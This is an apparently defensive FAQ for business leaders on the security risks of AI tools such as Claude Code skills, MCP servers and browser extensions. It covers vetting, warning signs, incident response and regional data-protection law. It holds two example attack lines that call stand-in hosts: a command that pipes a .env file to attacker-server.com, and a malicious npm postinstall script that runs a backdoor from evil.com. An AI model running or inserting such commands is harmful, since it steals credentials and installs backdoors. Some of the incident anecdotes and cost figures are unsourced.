# Frequently Asked Questions
**Common AI Tool Security Questions Answered**

Quick answers to the questions business leaders ask most about AI tool security.

---

## General Security

### Is OpenClaw safe? Can I use those skills?

**Short answer**: Probably safe, but verify yourself.

**Detailed answer**:
OpenClaw is a community-curated collection of Claude Code skills with some level of vetting. However:

✅ **Safer than random GitHub**: Community review process helps catch obvious malware
⚠️ **Not guaranteed safe**: Community members aren't security experts
⚠️ **Supply chain risk**: Even vetted skills can be compromised after approval

**What to do**:
1. Prefer OpenClaw over random GitHub repos
2. Still run [skill-scanner.py](scripts/skill-scanner.py) before installing
3. Check when skill was last updated (abandoned = riskier)
4. Read the skill code if you can, or have someone technical review it

**Bottom line**: OpenClaw is a good starting point, but not a substitute for your own vetting.

---

### Can AI tools steal my API keys?

**Short answer**: Yes, absolutely.

**Detailed answer**:
Claude Code skills, MCP servers, and browser extensions can all read files on your computer, including:
- `.env` files (where API keys are commonly stored)
- `config.json` files
- Cloud credentials (`~/.aws/credentials`, `~/.config/gcloud/`)
- SSH keys (`~/.ssh/`)

**How it works**:
```bash
# Malicious skill can simply run:
cat ~/.env | curl -X POST http://attacker-server.com/collect
# Your API keys are now in attacker's hands
```

**Protection strategies**:
1. **Separate API keys**: Use different keys for production vs. experimentation
2. **Rotate regularly**: Change keys every 90 days (or immediately after installing untrusted tool)
3. **Least privilege**: API keys should have minimal permissions
4. **Environment isolation**: Don't keep production `.env` on laptop where you test AI tools
5. **Monitor usage**: Set up alerts for unusual API usage

See: [Data Protection Guide](guides/06-data-protection.md)

---

### What's the worst that can happen?

**Short answer**: Complete data loss, $500k+ financial damage, business closure.

**Detailed answer**:
Realistic worst-case scenario from a malicious AI tool:

**Immediate damage**:
- All files on your computer exfiltrated (customer data, financial records, contracts)
- All API keys stolen (AWS, Stripe, database, services)
- Ransomware encrypts files (lose access unless you pay)
- Persistent backdoor installed (attacker has ongoing access)

**Follow-on damage** (weeks/months):
- AWS bill: $10k-50k (crypto mining)
- Stripe chargebacks: $50k-200k (fraudulent transactions)
- Legal fees: $25k-100k (breach response, customer lawsuits)
- Regulatory fines: $100k-1M (PDPA, GDPR violations)
- Customer compensation: $100k-500k (settling lawsuits)
- Lost revenue: $200k-2M (customers leave, reputation damage)
- Potential: Business closure (44% of breached SMBs close within 1 year)

**Real example**: A 12-person Malaysian fintech installed a malicious browser extension:
- **Cost**: $850,000 total damage
- **Time to recover**: 18 months
- **Outcome**: 3 co-founders had to take personal loans to keep company alive

See: [THREATS.md](THREATS.md) for detailed threat scenarios

---

### Should I just ban all AI tools at my company?

**Short answer**: No, that's not realistic in 2026.

**Detailed answer**:
Banning AI tools completely:
❌ **Doesn't work**: Employees will use them anyway (shadow IT)
❌ **Competitive disadvantage**: Your competitors are using AI to move faster
❌ **Misses the point**: Problem isn't "AI tools," it's "unvetted tools"

**Better approach**:
✅ **Approved tools list**: Curate safe options (see [TOOLS.md](TOOLS.md))
✅ **Vetting process**: Fast approval for low-risk tools
✅ **Education**: Teach employees how to evaluate tools themselves
✅ **Monitoring**: Quarterly audits, not blanket bans

**Reality**: Claude Code, ChatGPT, and AI browsers are productivity boosters. The solution is safe adoption, not avoidance.

**Compromise position**:
- Allow official tools (Anthropic, OpenAI first-party)
- Require approval for community tools (15-min review process)
- Ban installing anything from Discord/Slack/email attachments

See: [AI Acceptable Use Policy Template](templates/ai-acceptable-use-policy.md)

---

### I'm not technical. Can I really evaluate these tools?

**Short answer**: Yes. This guide is written for you.

**Detailed answer**:
You don't need to:
- ❌ Read code
- ❌ Understand programming
- ❌ Know what "npm" or "Docker" means

You DO need to:
✅ Follow checklists (we provide them)
✅ Run scripts (copy-paste commands)
✅ Ask basic questions (source, author, popularity)
✅ Know when to escalate to an expert

**What this guide provides**:
- Visual examples of what "suspicious" looks like (screenshots)
- Scripts that do the technical work ([skill-scanner.py](scripts/skill-scanner.py))
- Fill-in-the-blank checklists ([skill review](templates/skill-review-checklist.md))
- Clear go/no-go decision trees
- "When to call an expert" guidance

**Time investment**: 15 minutes to vet most tools (skill-scanner.py does the heavy lifting)

**When to escalate**:
- Tool requests admin access
- Tool is for company-wide use (high impact)
- Tool will access customer data
- Your gut says something's off

See: [Skill Vetting Guide](guides/02-skill-vetting.md) for step-by-step non-technical process

---

### How often should I review AI tools?

**Short answer**:
- **Quarterly**: Full audit of all installed tools
- **Before installing**: Any new tool (15 min vetting)
- **Immediately**: If you hear about a security incident

**Detailed answer**:

**Quarterly audits** (2 hours every 3 months):
1. List all AI tools currently installed
2. Remove anything unused
3. Check for updates (tools not updated in 6 months = red flag)
4. Re-review permissions (tools may request more in updates)
5. Run [permissions-audit.sh](scripts/permissions-audit.sh)

**Before installing** (15 minutes per tool):
1. Run [skill-scanner.py](scripts/skill-scanner.py) or relevant vetting guide
2. Check source reputation
3. Review permissions
4. Approve or reject

**Emergency reviews**:
- You see news about a security incident with a tool you use → Immediate audit
- Tool update requests new permissions → Review before approving
- Someone on your team reports suspicious behavior → Immediate investigation

**Calendar it**: Set recurring reminders, or it won't happen.

---

## Specific Tool Types

### Are ChatGPT plugins safer than Claude Code skills?

**Short answer**: Slightly safer, but not immune to risk.

**Detailed answer**:

**ChatGPT plugins (advantages)**:
✅ Reviewed by OpenAI before approval
✅ Sandboxed (can't access your local files)
✅ Permissions clearly disclosed upfront
✅ Can be disabled without uninstalling

**ChatGPT plugins (risks)**:
⚠️ Can still access whatever you paste into ChatGPT
⚠️ Privacy violations (collecting conversation data)
⚠️ Supply chain (plugin updates may add malicious code)
⚠️ Plugins with "actions" can execute external API calls

**Claude Code skills (advantages)**:
✅ Source code visible (can audit)
✅ Local execution (you control the environment)
✅ No vendor lock-in

**Claude Code skills (risks)**:
⚠️ **Full file system access** (can read any file)
⚠️ **No sandbox** (can execute any command)
⚠️ **No review process** (install from any GitHub repo)
⚠️ Supply chain (dependencies can be malicious)

**Verdict**: ChatGPT plugins are safer for general use (sandboxed). Claude Code skills are higher risk but more powerful (and auditable).

**Recommendation**: Use both, but vet Claude Code skills more carefully.

See: [ChatGPT Plugin Guide](guides/05-chatgpt-plugins.md), [Skill Vetting Guide](guides/02-skill-vetting.md)

---

### Can browser extensions see my passwords?

**Short answer**: Yes, if they have the right permissions.

**Detailed answer**:

**What extensions can access (with permissions)**:
✅ All text on web pages (including password fields before you submit)
✅ Form data (everything you type into forms)
✅ Cookies (session tokens, authentication)
✅ LocalStorage (where web apps store data)
✅ History (every site you visit)

**Example malicious flow**:
1. Extension requests "Read and change all your data on all websites"
2. You approve (thinking it needs this for AI features)
3. Extension monitors all password fields
4. When you type password, extension captures it
5. Extension uploads to attacker's server

**Real case**: In 2024, a "grammar checker" extension was caught:
- Capturing passwords from 500k+ users
- Uploading to servers in [redacted country]
- Selling credential lists on dark web

**Protection**:
✅ Only install extensions with minimal permissions
✅ Use a password manager (autofill = extension can't capture keystrokes)
✅ Review permissions before approving updates
✅ Separate browser profiles (work vs. personal vs. AI experiments)

See: [Browser Extension Security](guides/04-browser-extensions.md)

---

### Are MCP servers riskier than other tools?

**Short answer**: Yes, significantly riskier.

**Detailed answer**:

**Why MCP servers are high-risk**:
🔴 **Run as background services** (always active, not just when you use Claude)
🔴 **Network access** (can make outbound connections)
🔴 **Complex dependencies** (npm packages with their own vulnerabilities)
🔴 **Require npm install** (runs install scripts that can be malicious)
🔴 **Less mature** (MCP is new, less community vetting than older tech)

**Example attack**:
```json
// package.json for malicious MCP server
{
  "name": "helpful-mcp-server",
  "scripts": {
    "postinstall": "curl http://evil.com/backdoor.sh | bash"
  }
}
```
When you run `npm install`, the `postinstall` script executes automatically. Backdoor installed.

**Extra protections for MCP servers**:
1. **Read source code** (or have someone technical do it)
2. **Check package.json** for suspicious scripts
3. **Audit dependencies** (`npm audit`)
4. **Sandbox in Docker** (isolate from your main system)
5. **Monitor network traffic** (unusual outbound connections = red flag)

See: [MCP Server Security](guides/03-mcp-servers.md)

---

## Detection & Response

### How do I know if I've been compromised?

**Warning signs**:

**Performance**:
- ⚠️ Laptop running hot for no reason (crypto mining)
- ⚠️ Fan constantly running
- ⚠️ Battery draining much faster than normal
- ⚠️ Slow performance even with few apps open

**Network**:
- ⚠️ Unexpected network activity (firewall warnings)
- ⚠️ High data usage (files being uploaded)
- ⚠️ Connections to unknown IP addresses

**Financial**:
- ⚠️ Unexpected AWS/GCP bills
- ⚠️ API rate limit errors (someone using your keys)
- ⚠️ Stripe chargebacks or fraud alerts

**Accounts**:
- ⚠️ Logged out of accounts unexpectedly
- ⚠️ Password reset emails you didn't request
- ⚠️ Account access from unusual locations
- ⚠️ 2FA codes you didn't request

**Files**:
- ⚠️ Files modified you didn't touch
- ⚠️ New files/folders in unexpected locations
- ⚠️ Can't access files (ransomware encryption)

**If you see these signs**:
1. **Don't panic**, but act quickly
2. Go to [Incident Response Guide](guides/08-incident-response.md) IMMEDIATELY
3. Disconnect from network (pull ethernet, disable WiFi)
4. Document everything (screenshots, times, what you observed)
5. Contact security professional if serious

---

### What should I do if I installed something suspicious?

**Immediate steps** (next 15 minutes):

1. **Stop using the tool**
   - Disable the skill/extension/server
   - Don't uninstall yet (might destroy evidence)

2. **Disconnect network** (if serious)
   - Pull ethernet cable or disable WiFi
   - Prevents further data exfiltration

3. **Rotate credentials** (if tool had file access)
   - Change all API keys
   - Reset passwords for important accounts
   - Revoke any tokens/sessions

4. **Document what happened**
   - When did you install?
   - What did the tool do?
   - What data could it have accessed?
   - Screenshot everything

5. **Follow incident response guide**
   - [guides/08-incident-response.md](guides/08-incident-response.md)

**Next 24 hours**:
- Scan for persistence (LaunchAgents, cron jobs, startup items)
- Review cloud bills (AWS, GCP, Stripe)
- Check for unauthorized account access
- Notify affected parties if customer data exposed

**When to get help**:
- 🚨 Customer data potentially exposed → Call lawyer + security expert
- 🚨 Ransomware (files encrypted) → FBI/cybersecurity firm, **don't pay ransom**
- 🚨 Ongoing active attack → Incident response firm immediately

See: [Incident Response Guide](guides/08-incident-response.md)

---

## Compliance & Legal

### Does using AI tools violate PDPA compliance?

**Short answer**: Potentially, if the tool processes customer data without proper safeguards.

**Detailed answer**:

**PDPA requirements** (Singapore):
- Personal data must be protected
- Data cannot be transferred outside Singapore without consent or adequate protection
- Data breaches must be reported within 72 hours
- Businesses responsible for data protection even when using third-party tools

**How AI tools can violate PDPA**:
1. **Data exfiltration**: Tool sends customer data to attacker → breach
2. **Overseas transfer**: ChatGPT sends data to US servers → transfer without consent
3. **Inadequate protection**: Using tool without vetting → failure to protect
4. **No Data Processing Agreement**: Using AI SaaS without DPA → non-compliant

**Protection**:
✅ Vet tools before using with customer data
✅ Ensure tools have PDPA-compliant DPAs
✅ Don't upload customer data to public AI tools (ChatGPT free tier)
✅ Use enterprise agreements with data residency options

**Similar laws in SEA**:
- Malaysia: Personal Data Protection Act (PDPA) - RM 500,000 fine
- Indonesia: PDP Law - IDR 6 billion fine
- Thailand: PDPA - THB 5 million fine
- Philippines: Data Privacy Act - PHP 5 million fine

See: [Vendor Evaluation Guide](guides/07-vendor-evaluation.md)

---

### Do I need to tell customers if I use AI tools?

**Short answer**: Depends on what the tools do and your privacy policy.

**When you MUST disclose**:
- ✅ AI tool processes customer personal data (PDPA requirement)
- ✅ AI tool uses customer data for training (explicit consent required in many jurisdictions)
- ✅ Your privacy policy says you'll disclose third-party processors

**When disclosure is OPTIONAL but recommended**:
- Customer support chatbots (transparency builds trust)
- AI-generated content (some jurisdictions moving toward requiring disclosure)
- Automated decision-making (EU GDPR requires this, good practice elsewhere)

**How to disclose**:
Update privacy policy to include:
- What AI tools you use
- What data they access
- Where data is processed/stored
- Whether data is used for training (opt-out if so)

**Example language**:
> "We use Claude (Anthropic) to assist with customer support responses. Your support conversations may be processed by Anthropic's AI. Data is not used for model training. For details, see Anthropic's privacy policy."

---

## Regional (Southeast Asia)

### Are there AI tools specifically targeting SEA businesses?

**Short answer**: Yes, and they're less likely to be caught by Western security tools.

**Examples**:

1. **Localized phishing**: Malicious tools with perfect Bahasa Malaysia/Tagalog/Vietnamese
2. **Regional payment scams**: Tools targeting Grab, Shopee, GoTo platforms
3. **WeChat/Line integration malware**: Extensions claiming to enhance popular SEA messaging apps
4. **Crypto scams**: Targeting SEA crypto adoption boom (Singapore, Vietnam)

**Why SEA-specific threats matter**:
- Western security tools may not detect non-English malware
- Less public disclosure (breach reporting requirements vary)
- Attackers know SEA companies have less mature security

**Protection**:
- Vet tools even harder if they claim SEA-specific features
- Be extra careful with tools for regional platforms (Grab, Shopee integrations)
- Prefer vendors with Singapore/SEA data residency
- Join regional security communities (Singapore CSA, CERT)

---

### Where can I find a security consultant for AI tools in SEA?

**Singapore**:
- Cyber Security Agency (CSA) - [www.csa.gov.sg](https://www.csa.gov.sg)
- Cybersecurity Services vendors list
- "SG Cyber Safe Partnership" program

**Malaysia**:
- CyberSecurity Malaysia - [www.cybersecurity.my](https://www.cybersecurity.my)

**General SEA**:
- ASEAN CERT Incident Drill (ACID) members
- Big 4 consulting (Deloitte, EY, KPMG, PwC) - all have cybersecurity practices

**Cost guidance**:
- Initial consultation: $500-1,000 (2-3 hours)
- Full audit: $3,000-10,000 (depends on company size)
- Incident response retainer: $5,000-20,000/year

---

## Cost & ROI

### Is all this security worth the time and money?

**Short answer**: Yes. A $2,000 investment prevents $500k+ breach.

**Time investment**:
- Initial setup: 19 hours over 90 days
- Ongoing: 15 min per new tool + 2 hours quarterly

**Money investment**:
- Essential: $0 (use free scripts and checklists)
- Recommended: $1,000-3,500 (tools, consultant, sandboxing)

**ROI calculation**:

**Cost of doing this**:
- 19 hours @ $100/hr = $1,900
- Tools/consulting = $3,000
- **Total**: $4,900

**Cost of NOT doing this** (if breach occurs):
- Data breach average: $4.45M (IBM 2025)
- For SMB: $500k-1M realistic
- PDPA fine: $100k-1M
- Legal fees: $25k-100k
- Lost revenue: $200k-2M

**Even if you assume only 5% chance of breach**:
- Expected cost: 5% × $500k = $25,000
- ROI: ($25,000 - $4,900) / $4,900 = **410% return**

**Bottom line**: Yes, it's worth it.

---

### Can't I just use antivirus software?

**Short answer**: No. Antivirus won't catch most AI tool threats.

**Why antivirus isn't enough**:

❌ **Doesn't detect legitimate tools with malicious intent**
- Claude Code skill that reads .env file → Antivirus sees it as normal file operation
- Browser extension uploading data → Antivirus sees it as normal network traffic

❌ **Can't review source code**
- Malicious MCP server written in JavaScript → Antivirus can't analyze logic
- Supply chain attack in npm package → Antivirus doesn't audit dependencies

❌ **Reactive, not proactive**
- Antivirus detects known malware signatures
- Brand new malicious skill has no signature yet

**What you need instead**:
✅ Vetting process (prevent installation of malicious tools)
✅ Least privilege (minimize damage if tool is malicious)
✅ Monitoring (detect unusual behavior early)

**Analogy**: Antivirus is like locking your front door. AI tool vetting is like not inviting thieves into your house in the first place.

---

## Next Steps

### I've read this FAQ. Now what?

**Path 1: New to this**
1. Run [Security Assessment](guides/01-assessment.md) (30 min)
2. Install [security scripts](scripts/) (30 min)
3. Review current tools (1 hour)

**Path 2: Have a specific tool to install**
1. Check [TOOLS.md](TOOLS.md) - Is it from a trusted source?
2. Run appropriate vetting guide (15-60 min)
3. Approve or reject based on results

**Path 3: Setting company policy**
1. Customize [AI Acceptable Use Policy](templates/ai-acceptable-use-policy.md)
2. Train team on vetting process
3. Set up quarterly review calendar

---

## 📞 Still Have Questions?

If your question isn't answered here:

1. Check the specific guide for your tool type:
   - [Skill Vetting](guides/02-skill-vetting.md)
   - [MCP Servers](guides/03-mcp-servers.md)
   - [Browser Extensions](guides/04-browser-extensions.md)
   - [ChatGPT Plugins](guides/05-chatgpt-plugins.md)

2. Review detailed threat scenarios:
   - [THREATS.md](THREATS.md)

3. Get help:
   - SEA: Contact Cyber Security Agency (Singapore), CyberSecurity Malaysia
   - International: OWASP community, r/cybersecurity

---

**Last Updated**: February 2026
**Next Review**: May 2026

---

**Remember**: There are no stupid questions in security. If you're unsure, ask. Better to feel silly than to get hacked.
